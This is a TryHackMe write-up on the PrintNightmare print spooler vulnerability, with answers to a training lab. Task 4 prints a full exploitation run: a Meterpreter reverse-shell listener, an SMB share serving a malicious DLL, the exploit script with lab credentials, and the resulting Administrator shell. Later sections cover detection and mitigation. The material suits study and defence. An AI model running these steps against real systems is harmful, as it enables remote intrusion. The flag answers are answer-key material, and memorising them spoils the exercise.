---
title: PrintNightmare 
author: CYB3RM3
name: CYB3RM3 | PrintNightmare 
date: 2022-05-13 22:20:40 +0100
categories: [TryHackMe, CVE]
tags: [CVE]
---

Learn about the vulnerability known as PrintNightmare (CVE-2021-1675) and (CVE-2021-34527).

THM Room [https://tryhackme.com/room/intronetworksecurity](https://tryhackme.com/room/intronetworksecurity)


## TASK 1 : Introduction
### Read the above. 
No Answer

## TASK 2 : Windows Print Spooler Service
### Where would you enable or disable Print Spooler Service? 
We can find and enable or disable the Print Spooler Service in the Services ("services.msc").

Answer : services

## TASK 3 : Remote Code Execution Vulnerability
###  Provide the CVE of the Windows Print Spooler Remote Code Execution Vulnerability that doesn't require local access to the machine. 

"To exploit the CVE-2021-1675 vulnerability, the attacker would need to have direct or local access to the machine to use a malicious DLL file to escalate privileges. To exploit the CVE-2021-34527 vulnerability successfully, the attacker can remotely inject the malicious DLL file. "

Answer : CVE-2021-34527

### What date was the CVE assigned for the vulnerability in the previous question? (mm/dd/yyyy)

"July 2, 2021: Microsoft assigns a new CVE so-called PrintNightmare vulnerability in the print spooler service (CVE-2021-34527)."

Answer : 07/02/2021

## TASK 4 : Try it yourself!
### What is the flag residing on the Administrator's Desktop? 

We need to prepare some things before launching the exploit.

When proper impacket and pysian1 dowloaded, i did in 3 terminals :

Terminal 1 : open metasploit

```console
[...]
Metasploit tip: To save all commands executed since start up to a file, use the makerc command

msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 10.10.240.75
lhost => 10.10.240.75
msf5 exploit(multi/handler) > set lport 4444
lport => 4444
msf5 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.240.75:4444 
msf5 exploit(multi/handler) > jobs

Jobs
====

  Id  Name                    Payload                              Payload opts
  --  ----                    -------                              ------------
  0   Exploit: multi/handler  windows/x64/meterpreter/reverse_tcp  tcp://10.10.240.75:4444

msf5 exploit(multi/handler) >
```
{: .nolineno }

Terminal 2 : open a share on attacker machine :

```console
root@ip-10-10-240-75:~/Desktop/pn# smbserver.py share /root/Deskto/share -smb2support
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
{: .nolineno }

Terminal 3 : check if target fits criteria for the exploit :

```console
root@ip-10-10-240-75:~/Desktop/pn# rpcdump.py @10.10.87.98 |egrep 'MS-RPRN|MS-PAR'
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 

root@ip-10-10-27-152:~/Desktop/pn/CVE-2021-1675# python CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@10.10.254.219 '\\10.10.27.152\share\malicious.dll'
[*] Connecting to ncacn_np:10.10.254.219[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\10.10.27.152\share\malicious.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...

[...]  
```
{: .nolineno }

In the metasploit console :

```console
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is F0DC-5D15

 Directory of C:\Users\Administrator\Desktop

08/13/2021  07:40 AM    <DIR>          .
08/13/2021  07:40 AM    <DIR>          ..
08/13/2021  07:40 AM                23 flag.txt
               1 File(s)             23 bytes
               2 Dir(s)   3,260,416,000 bytes free

msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.27.152:4444 
[*] Sending stage (201283 bytes) to 10.10.254.219
[*] Meterpreter session 5 opened (10.10.27.152:4444 -> 10.10.254.219:49768) at 2022-05-05 18:39:37 +0100

meterpreter > shell
Process 1856 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd /Users/Administrator/Desktop
cd /Users/Administrator/Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is F0DC-5D15

 Directory of C:\Users\Administrator\Desktop

08/13/2021  07:40 AM    <DIR>          .
08/13/2021  07:40 AM    <DIR>          ..
08/13/2021  07:40 AM                23 flag.txt
               1 File(s)             23 bytes
               2 Dir(s)   3,335,790,592 bytes free

C:\Users\Administrator\Desktop>type flag.txt
type flag.txt
THM{SiGBQPMkSvejvmQNEL}
C:\Users\Administrator\Desktop>
```
{: .nolineno }

Answer : THM{SiGBQPMkSvejvmQNEL}

## TASK 5 : Indicators of Compromise
### Provide the first folder path where you would likely find the dropped DLL payload. 
From the text :

![Operations](/images/thm/printnightmarehpzqlp8/printnightmarehpzqlp8_1.png)
_Operations_

If you don't know what refer %windir%, just enter this in "windows + R" execute prompt :

![Windir](/images/thm/printnightmarehpzqlp8/printnightmarehpzqlp8_2.png)
_Windir_

This will open an explorer in the C:\Windows directory :

![Windir Explorer](/images/thm/printnightmarehpzqlp8/printnightmarehpzqlp8_3.png)
_Windir Explorer_

Answer : C:\Windows\system32\spool\drivers\x64\3\

### Provide the function that is used to install printer drivers.

Answer : pcAddPrinterDriverEx()

### What tool can the attacker use to scan for vulnerable print servers?

"The attacker would most likely use rpcdump.py to scan for vulnerable hosts. After finding the vulnerable print server, the attacker can then execute the exploit code (similar to the Python script in the previous task), which will load the malicious DLL file to exploit the vulnerability. More specifically, the exploit code will call the pcAddPrinterDriverEx() function from the authenticated user account and load the malicious DLL file in order to exploit the vulnerability. The pcAddPrinterDriverEx() function is used to install a printer driver on the system."

Answer : rpcdump.py

## TASK 6 : Detection: Windows Event Logs
### Provide the name of the dropped DLL, including the error code. (no space after the comma)  

Checking the event viewer logs in the path "Applications and Services" > "Microsoft" > "Windows" > "PrintService" :

![Eventvwr](/images/thm/printnightmarehpzqlp8/printnightmarehpzqlp8_4.png)
_Eventvwr_

We find the Error woth the dll dropped.

Answer : svch0st.dll,0x45

### Provide the event log name and the event ID that detected the dropped DLL. (no space after the comma) 

![Eventvwr Printspooler](/images/thm/printnightmarehpzqlp8/printnightmarehpzqlp8_5.png)
_Eventvwr Printspooler_

Answer : Microsoft-Windows-PrintService/Admin,808

### Find the source name and the event ID when the Print Spooler Service stopped unexpectedly and how many times was this event logged? (format: answer,answer,answer)

From the EventIDs given, 7031 seems to be the one we searched for :

![Event ID 7031](/images/thm/printnightmarehpzqlp8/printnightmarehpzqlp8_6.png)
_Event ID 7031_

Answer : Service Control Manager,7031,1

###  After some threat hunting steps, you are more confident now that it's a PrintNightmare attack. Hunt for the attacker's shell connection. Provide the log name, event ID, and destination port. (format: answer,answer,answer) 
Network logs are logged in Microsoft-Windows-Sysmon :

![Event ID 3](/images/thm/printnightmarehpzqlp8/printnightmarehpzqlp8_7.png)
_Event ID 3_

Answer : Microsoft-Windows-Sysmon/Operational,3,4747

### Oh no! You think you've found the attacker's connection. You need to know the attacker's IP address and the destination hostname in order to terminate the connection.  Provide the attacker's IP address and the hostname. (format: answer,answer)

In the same log than previous question :

![Sysmon Event](/images/thm/printnightmarehpzqlp8/printnightmarehpzqlp8_8.png)
_Sysmon Event_

Answer : 10.10.210.100,ip-10-10-210-100.eu-west-1.compute.internal

### A Sysmon FileCreated event was generated and logged. Provide the full path to the dropped DLL and the earliest creation time in UTC.  (format:answer,yyyy-mm-dd hh-mm-ss)

From previous question, we knows the approximative time then searching for event ID 11 :

![EventID 11](/images/thm/printnightmarehpzqlp8/printnightmarehpzqlp8_9.png)
_EventID 11_

![EventID 11](/images/thm/printnightmarehpzqlp8/printnightmarehpzqlp8_10.png)
_EventID 11_

Answer : C:\Windows\System32\spool\drivers\x64\3\New\svch0st.dll,2021-08-13 17-33-40

## TASK 7 : Detection: Packet Analysis

### What is the host name of the domain controller? 
Printnightmare is an attack occuring through SMB protocol, so let's filter through SMB protocol.

Checking the netBIOS datagram, i found the name of the domain controler over the printnightmare.local domain :

![smb](/images/thm/printnightmarehpzqlp8/printnightmarehpzqlp8_11.png)
_smb_

Answer : WIN-1O0UJBNP9G7

### What is the local domain?

We can find the domain from previous question or diving deeper into the communication captured in the wireshark, following the TCP stream : 

![TCP Stream](/images/thm/printnightmarehpzqlp8/printnightmarehpzqlp8_12.png)
_TCP Stream_

We can also retreive this information from the SMB filter :

![smb2](/images/thm/printnightmarehpzqlp8/printnightmarehpzqlp8_13.png)
_smb2_

Answer : printnightmare.local

### What user account was utilized to exploit the vulnerability?

From previous question, we also got the user used.

Answer : lowprivlarry

### What was the malicious DLL used in the exploit?

Searching for dll into the tcp stream :

![smb tcp stream](/images/thm/printnightmarehpzqlp8/printnightmarehpzqlp8_14.png)
_smb tcp stream_

![smb tcp stream 2](/images/thm/printnightmarehpzqlp8/printnightmarehpzqlp8_15.png)
_smb tcp tream 2_

### What was the attacker's IP address?

From the previous question, we saw the IP that share the dll malicious file.

Answer : 10.10.124.236

### What was the UNC path where the malicious DLL was hosted?

We can se the share available for downloading the exploit dll file in the SMB filter and the file requested :

![share](/images/thm/printnightmarehpzqlp8/printnightmarehpzqlp8_16.png)
_share_

### There are encrypted packets in the results. What was the associated protocol?

![SMB3](/images/thm/printnightmarehpzqlp8/printnightmarehpzqlp8_17.png)
_SMB3_

Answer : SMB3

## TASK 8 : Mitigation: Disable Print Spooler


### Provide two ways to manually disable the Print Spooler Service. (format: answer,answer) 

![disable the Print Spooler](/images/thm/printnightmarehpzqlp8/printnightmarehpzqlp8_18.png)
_disable the Print Spooler_

Answer : PowerShell, group policy

### Where can you disable the Print Spooler Service in Group Policy? (format: no spaces between the forward slashes)

From the group policy section in the above screenshot :

Answer : Computer Configuration / Administrative Templates / Printers

### Provide the command in PowerShell to detect if Print Spooler Service is enabled and running.

Before option 1 is the way to determine in powershell if the print spooler is enable or not.

Answer : Get-Service -Name Spooler
## TASK 9 : Conclusion 

### Read the above.

No Answer.